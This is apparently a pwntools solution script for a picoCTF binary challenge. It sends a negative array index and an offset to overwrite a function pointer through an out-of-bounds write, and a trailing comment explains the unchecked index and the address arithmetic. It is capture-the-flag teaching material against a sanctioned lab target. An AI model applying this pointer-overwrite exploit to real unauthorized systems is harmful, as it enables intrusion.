#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('vuln')

host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 60896)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recv()
io.sendline(b"AAAA")  # sending story (isn't used/helpful at all lol)
io.sendlineafter(b"\n", b"-16")  # sending num1 (explainatation below)
io.sendline(b"47")  # sending num2 (explainatation below)

io.interactive()


'''
Why num1 needs to be -16? first, we can provide a negative number for num1 variable, which is then used as an index in the fun variable.
In addition, there is not a single check if num1 (which is used as an index) is negative.
In this way, we can write outside of the array boundaries. Now the interesting part is where to write?
Well, if we write at an offset of 16 backwards of fun variable, we reach the "check" variable
(bc of PIE being disabled, the addresses doesn't change so its the same on your machine and on the server'. "fun" is at 0x804c080, "check" is 64 bytes behind, at 0x804c040, 64 / 4 = 16).
Then we can control its value. Thats what we do in num2.
In num2 we send the number 47, which adds up (bc of the += we can see in the source) to the value there.
WAIT! what value is there!??! good question. The value that "check" holds is a pointer to the first instruction in "hard_checker" function. So the += 47 brings us to the following instruction in the function "hard_checker" - 0x08049465 <+47>:   mov    DWORD PTR [ebp-0x4c],0x0
which is basically the instruction - char buf[FLAGSIZE] = {0};  in the source.
So to sum up, we just change the address where the "check" variable points to, to eventually print the flag.
NICE :)
'''
